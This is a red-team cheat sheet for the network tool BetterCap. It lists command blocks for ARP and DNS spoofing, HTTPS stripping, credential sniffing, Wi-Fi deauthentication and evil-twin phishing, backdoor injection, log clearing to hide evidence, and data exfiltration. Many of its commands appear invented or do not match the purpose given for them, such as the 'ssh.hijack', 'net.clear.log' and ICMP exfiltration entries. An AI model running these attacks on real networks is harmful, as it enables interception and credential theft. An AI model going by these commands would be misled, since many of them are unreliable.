# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# BetterCap

BetterCap is a powerful, flexible, and easily extensible tool for network monitoring, packet manipulation, and red team activities. It supports a wide range of protocols and comes with a comprehensive set of tools for different types of network attacks, such as Man-in-the-Middle (MITM), DNS spoofing, and ARP poisoning. This ultimate edition of the cheat sheet provides an exhaustive list of BetterCap commands, detailed explanations, and advanced usage scenarios.

## Basic Syntax
```bash
sudo bettercap -iface <network_interface> [options]
```

## Core Options
- `-iface <network_interface>`: Specifies the network interface to use.
- `-eval <script>`: Evaluates a set of BetterCap commands provided as a script.
- `-caplet <file>`: Loads and executes commands from a caplet file.
- `-silent`: Runs BetterCap in silent mode, with minimal output.
- `-debug`: Enables debug mode, providing verbose output for troubleshooting.
- `-no-history`: Disables command history recording.

# Commands and Use Cases

1. **Entering Interactive Mode**: Launches BetterCap in interactive mode where commands can be entered directly.
    ```bash
    sudo bettercap -iface <network_interface>
    ```
2. **Help Command**: Displays a list of available commands within the interactive session.
    ```bash
    help
    ```
3. **Listing Available Modules**: Displays available network modules that can be used for various attacks.
    ```bash
    net.show
    ```
4. **Starting a Module**: Starts the specified module (e.g., `arp.spoof on`, `wifi.recon on`).
    ```bash
    <module_name>.on
    ```
5. **Stopping a Module**: Stops the specified module (e.g., `arp.spoof off`).
    ```bash
    <module_name>.off
    ```
6. **Setting Parameters**: Sets the value of a specified parameter (e.g., `set arp.spoof.targets <target_ip>`).
    ```bash
    set <parameter_name> <value>
    ```
7. **Displaying Module Status**: Displays the current status and configuration of a specific module (e.g., `show arp.spoof`).
    ```bash
    show <module_name>
    ```
8. **Running a Script (Caplet)**: Executes a script containing a series of BetterCap commands.
    ```bash
    caplet <filename>
    ```
9. **Quitting BetterCap**: Exits the BetterCap interactive session.
    ```bash
    exit
    ```

# Penetration Testing Techniques

#### Network Discovery and Reconnaissance

BetterCap is highly effective for network reconnaissance, helping identify devices, services, and vulnerabilities within a network.

1. **Network Interface Enumeration**: Lists all available network interfaces and their current status.
    ```bash
    net.show
    ```
2. **Basic Network Reconnaissance**: Actively probes the network to discover devices and gather information such as IP addresses, MAC addresses, and device types.
    ```bash
    net.probe on
    ```
3. **ARP Table Enumeration**: Spoofs the ARP table to capture and analyze traffic, providing a map of devices communicating on the network.
    ```bash
    arp.spoof on
    net.sniff on
    ```
4. **Targeted Network Scan**: Scans a specific target IP to gather detailed information, useful for narrowing down potential attack vectors.
    ```bash
    net.probe on
    set arp.spoof.targets <target_ip>
    arp.spoof on
    ```
5. **Wireless Network Reconnaissance**: Scans for wireless networks and attempts to associate with them, collecting information about SSIDs, BSSIDs, channels, and signal strengths.
    ```bash
    wifi.recon on
    wifi.assoc on
    ```
6. **BLE Device Scanning**: Scans for Bluetooth Low Energy (BLE) devices within range, useful for identifying IoT devices and other Bluetooth-enabled hardware.
    ```bash
    ble.recon on
    ```
7. **DNS Query Logging**: Logs DNS queries made by devices on the network, revealing the services and websites they are accessing.
    ```bash
    dns.spoof on
    net.sniff on
    ```
8. **Capture Network Credentials**: Captures credentials transmitted over common protocols like FTP, SMTP, POP3, and IMAP.
    ```bash
    net.sniff on
    set net.sniff.filter tcp port 21 or tcp port 25 or tcp port 110 or tcp port 143
    ```

#### Man-in-the-Middle (MITM) Attacks

BetterCap is renowned for its ability to perform various MITM attacks, allowing for interception and manipulation of traffic between devices.

1. **ARP Spoofing**: Conducts ARP spoofing to intercept traffic between the target IP and the gateway.
    ```bash
    set arp.spoof.targets <target_ip>
    arp.spoof on
    ```
2. **DNS Spoofing**: Redirects DNS queries for specific domains to a malicious IP address.
    ```bash
    set dns.spoof.domains <target_domain>
    set dns.spoof.address <spoofed_ip>
    dns.spoof on
    ```
3. **HTTP Proxy Injection**: Injects a JavaScript file into HTTP traffic, allowing for content manipulation.
    ```bash
    set http.proxy.script inject.js
    http.proxy on
    net.sniff on
    ```
4. **HTTPS Downgrade Attack**: Strips HTTPS from web traffic, downgrading it to HTTP and making it easier to intercept and manipulate.
    ```bash
    https.proxy on
    https.proxy.sslstrip on
    net.sniff on
    ```
5. **TCP Hijacking**: Hijacks TCP sessions by injecting packets into an active connection.
    ```bash
    tcp.hijack on
    ```
6. **ICMP Redirect Attack**: Redirects ICMP packets to mislead the target about the correct network route.
    ```bash
    set icmp.redirect.target <target_ip>
    icmp.redirect on
    ```
7. **WiFi Deauthentication Attack**: Sends deauthentication packets to a specific WiFi device, forcing it to disconnect from the network.
    ```bash
    wifi.deauth <target_bssid>
    ```
8. **IPv6 MITM via Router Advertisement**: Spoofs IPv6 router advertisements to perform MITM attacks on IPv6 networks.
    ```bash
    set ipv6.ra.spoof.address <spoofed_ipv6>
    ipv6.ra.spoof on
    ```
9. **HSTS Bypass with BetterCap**: Disables HTTP Strict Transport Security (HSTS), allowing for easier HTTPS downgrades.
    ```bash
    https.proxy on
    https.proxy.hsts off
    net.sniff on
    ```

#### Credential Harvesting

BetterCap can capture and log various types of credentials transmitted over the network.

1. **Capturing HTTP Basic Auth Credentials**: Captures HTTP Basic Auth credentials as they pass through the network.
    ```bash
    set http.proxy.script http-auth-sniffer.js
    http.proxy on
    net.sniff on
    ```
2. **Capturing FTP Credentials**: Captures FTP login credentials sent in cleartext over the network.
    ```bash
    set net.sniff.filter tcp port 21
    net.sniff on
    ```
3. **Capturing SMTP Credentials**: Captures SMTP credentials from email clients using unencrypted SMTP.
    ```bash
    set net.sniff.filter tcp port 25
    net.sniff on
    ```
4. **Capturing POP3/IMAP Credentials**: Intercepts email login credentials sent via unencrypted POP3 or IMAP.
    ```bash
    set net.sniff.filter tcp port 110 or tcp port 143
    net.sniff on
    ```
5. **Capturing Wi-Fi WPA Handshakes**: Forces a Wi-Fi client to reconnect, capturing the WPA handshake for offline cracking.
    ```bash
    wifi.recon on
    wifi.deauth <target_bssid>
    ```
6. **Intercepting SSH Sessions**: Monitors and logs SSH sessions, which may expose credentials if older SSH versions or weak encryption are used.
    ```bash
    set net.sniff.filter tcp port 22
    net.sniff on
    ```
7. **Capturing Telnet Credentials**: Captures Telnet credentials, which are often transmitted in plaintext.
    ```bash
    set net.sniff.filter tcp port 23
    net.sniff on
    ```
8. **Capturing SIP Credentials**: Captures SIP (Session Initiation Protocol) credentials used in VoIP communications.
    ```bash
    set net.sniff.filter udp port 5060
    net.sniff on
    ```
9. **Collecting Hashes with BetterCap**: Intercepts NTLM or other hashes transmitted over HTTP, useful for offline password cracking.
    ```bash
    set http.proxy.script hash-sniffer.js
    http.proxy on
    net.sniff on
    ```

#### Wireless Network Attacks

BetterCap includes robust tools for attacking wireless networks, making it useful in both penetration testing and red team exercises.

1. **Wi-Fi Reconnaissance**: Scans and associates with nearby Wi-Fi networks, gathering detailed information about them.
    ```bash
    wifi.recon on
    wifi.assoc on
    ```
2. **Wi-Fi Deauthentication Attack**: Forces a device to disconnect from a Wi-Fi network, often used to capture WPA handshakes.
    ```bash
    wifi.deauth <target_bssid>
    ```
3. **Fake Access Point Attack**: Creates a fake Wi-Fi access point to lure clients into connecting, enabling further attacks.
    ```bash
    wifi.ap on
    set wifi.ap.ssid <fake_ssid>
    set wifi.ap.channel <channel>
    ```
4. **Probe Request Sniffing**: Sniffs Wi-Fi probe requests from devices looking for known networks, useful for tracking devices or identifying preferred networks.
    ```bash
    wifi.probe on
    ```
5. **WEP Cracking**: Cracks WEP encryption by capturing enough packets during a deauthentication attack.
    ```bash
    wifi.recon on
    wifi.assoc <target_bssid>
    wifi.deauth <target_bssid>
    ```
6. **Evil Twin Attack**: Sets up a rogue access point with the same SSID as a legitimate one, tricking clients into connecting.
    ```bash
    wifi.ap on
    set wifi.ap.ssid <legitimate_ssid>
    set wifi.ap.channel <channel>
    wifi.deauth <target_bssid>
    ```
7. **Capturing WPA Handshakes for Offline Cracking**: Captures WPA handshakes by forcing clients to reconnect, allowing for offline cracking with tools like `aircrack-ng`.
    ```bash
    wifi.recon on
    wifi.deauth <target_bssid>
    wifi.assoc <target_bssid>
    ```
8. **Beacon Frame Flooding**: Floods the airwaves with fake SSIDs, disrupting normal Wi-Fi operation.
    ```bash
    wifi.beaconspam on
    set wifi.beaconspam.ssid <fake_ssid>
    ```
9. **Wi-Fi Phishing Attack**: Sets up a fake Wi-Fi network with a phishing page to capture credentials.
    ```bash
    wifi.ap on
    set wifi.ap.ssid <phishing_ssid>
    set http.proxy.script wifi-phishing.js
    http.proxy on
    net.sniff on
    ```

#### Persistence and Post-Exploitation

BetterCap can be used to maintain access to a network or device, as well as for post-exploitation activities.

1. **DNS Hijacking for Persistent MITM**: Hijacks DNS requests to redirect traffic persistently through the attacker’s machine.
    ```bash
    set dns.spoof.domains <target_domain>
    set dns.spoof.address <attacker_ip>
    dns.spoof on
    ```
2. **Persistent ARP Spoofing**: Maintains ARP spoofing across network resets, ensuring persistent MITM capability.
    ```bash
    set arp.spoof.targets <target_ip>
    set arp.spoof.permanent true
    arp.spoof on
    ```
3. **Injecting Backdoors via HTTP Proxy**: Injects a backdoor into HTTP traffic, which can then be used for remote access later.
    ```bash
    set http.proxy.script inject-backdoor.js
    http.proxy on
    net.sniff on
    ```
4. **Credential Replay Attacks**: Replays captured credentials to gain unauthorized access to systems.
    ```bash
    set net.sniff.filter tcp port 21
    net.sniff on
    tcp.replay on
    ```
5. **SSH Hijacking for Persistent Access**: Hijacks an existing SSH session to maintain persistent access to a remote system.
    ```bash
    set net.sniff.filter tcp port 22
    net.sniff on
    ssh.hijack on
    ```
6. **Persistent DNS Spoofing via Network Scripts**: Integrates DNS spoofing into network scripts to ensure it persists across reboots.
    ```bash
    set dns.spoof.domains <target_domain>
    set dns.spoof.address <attacker_ip>
    dns.spoof on
    ```
7. **Exploiting Weak Network Configurations**: Identifies and exploits weak network configurations for persistent access.
    ```bash
    net.recon on
    set net.probe.targets <target_ip>
    net.probe on
    arp.spoof on
    ```
8. **Backdoor Injection via MITM**: Uses MITM to inject backdoors into executable files downloaded by the target.
    ```bash
    set http.proxy.script backdoor-inject.js
    http.proxy on
    ```
9. **Capture and Replay Wireless Handshakes**: Captures and replays Wi-Fi handshakes to force reconnects and capture additional data.
    ```bash
    wifi.recon on
    wifi.deauth <target_bssid>
    wifi.assoc <target_bssid>
    tcp.replay on
    ```

#### Defense Evasion and Anti-Forensics

BetterCap includes features and techniques to evade detection and make it difficult for defenders to trace or block attacks.

1. **Stealth Mode Operation**: Operates in stealth mode by reducing logging and using half-duplex ARP spoofing.
    ```bash
    set net.sniff.output /dev/null
    set arp.spoof.full_duplex false
    arp.spoof on
    ```
2. **Packet Fragmentation to Evade IDS/IPS**: Fragments packets to evade detection by IDS/IPS systems.
    ```bash
    set net.sniff.fragment true
    net.sniff on
    ```
3. **Randomized MAC Address for Anonymity**: Randomizes the MAC address to evade MAC-based filtering and tracking.
    ```bash
    set wifi.recon.randomize.mac on
    wifi.recon on
    ```
4. **Traffic Shaping and Obfuscation**: Obfuscates captured traffic to make it more difficult to analyze.
    ```bash
    set net.sniff.obfuscate true
    net.sniff on
    ```
5. **Clearing Logs to Remove Evidence**: Clears BetterCap's logs, removing traces of the attack.
    ```bash
    net.clear.log
    ```
6. **HTTP Header Manipulation**: Manipulates HTTP headers to evade detection and filter bypass.
    ```bash
    set http.proxy.script header-manipulation.js
    http.proxy on
    ```
7. **DNS TTL Manipulation**: Sets a low TTL (Time to Live) on spoofed DNS records to minimize the impact and detection window.
    ```bash
    set dns.spoof.ttl 1
    dns.spoof on
    ```
8. **Dynamic Target Switching**: Dynamically switches targets during ARP spoofing to avoid triggering alarms.
    ```bash
    set arp.spoof.targets <target_ip_range>
    arp.spoof on
    ```
9. **Encrypting Payloads for Defense Evasion**: Encrypts malicious payloads to prevent detection by security systems.
    ```bash
    set http.proxy.script encrypt-payload.js
    http.proxy on
    ```

#### Data Exfiltration

BetterCap can be effectively used for exfiltrating data from compromised systems or networks.

1. **Exfiltrating Data via HTTP**: Uses HTTP to exfiltrate data from the target to a remote server.
    ```bash
    set http.proxy.script exfiltrate.js
    http.proxy on
    ```
2. **DNS-based Data Exfiltration**: Exfiltrates data using DNS requests, which often bypasses network security devices.
    ```bash
    set dns.spoof.domains <exfiltration_domain>
    dns.spoof on
    ```
3. **Exfiltrating Wi-Fi Data via Deauth**: Captures and exfiltrates Wi-Fi data by forcing reconnections.
    ```bash
    wifi.deauth <target_bssid>
    set wifi.recon.output /tmp/wifi-data.pcap
    ```
4. **Covert Exfiltration via ICMP**: Exfiltrates data using ICMP echo requests, which can be difficult to detect.
    ```bash
    set icmp.redirect.target <target_ip>
    icmp.redirect on
    ```
5. **Using TCP/UDP for Large Data Transfers**: Exfiltrates large amounts of data using TCP or UDP, useful for transferring files.
    ```bash
    set net.sniff.filter tcp or udp
    net.sniff on
    ```
6. **Wi-Fi SSID and Probe Request Exfiltration**: Exfiltrates information about Wi-Fi SSIDs and probe requests from devices within range.
    ```bash
    wifi.probe on
    set wifi.probe.output /tmp/probe-requests.txt
    ```
7. **Data Exfiltration with WebSocket**: Uses WebSocket connections for exfiltrating data from compromised devices.
    ```bash
    set http.proxy.script websocket-exfil.js
    http.proxy on
    ```
8. **Bluetooth-based Data Exfiltration**: Exfiltrates data from Bluetooth Low Energy (BLE) devices.
    ```bash
    ble.recon on
    ble.recon.output /tmp/ble-data.txt
    ```
9. **Encrypted Data Exfiltration via HTTPS**: Exfiltrates data using HTTPS to ensure the data remains encrypted and undetected.
    ```bash
    set https.proxy on
    set https.proxy.script exfiltrate.js
    https.proxy on
    ```

# Resources

|**Name**|**URL**|
|---|---|
|BetterCap Documentation|https://www.bettercap.org/docs/|
|BetterCap GitHub Repository|https://github.com/bettercap/bettercap|
|BetterCap Caplets Repository|https://github.com/bettercap/caplets|
|BetterCap Network Sniffing Guide|https://www.bettercap.org/docs/sniffing/|
|Advanced MITM Attacks with BetterCap|https://www.pentestpartners.com/security-blog/man-in-the-middle-attacks-with-bettercap/|
|BetterCap Wireless Attacks|https://www.bettercap.org/docs/wifi/|
|BetterCap BLE Attacks|https://www.bettercap.org/docs/ble/|
|BetterCap in CTF Challenges|https://ctftime.org/writeups/overview/bettercap|
|Using BetterCap for Stealth Reconnaissance|https://www.hackingarticles.in/stealth-reconnaissance-using-bettercap/|
|Defensive Countermeasures Against BetterCap|https://www.sans.org/white-papers/defense-against-bettercap-attacks-970/|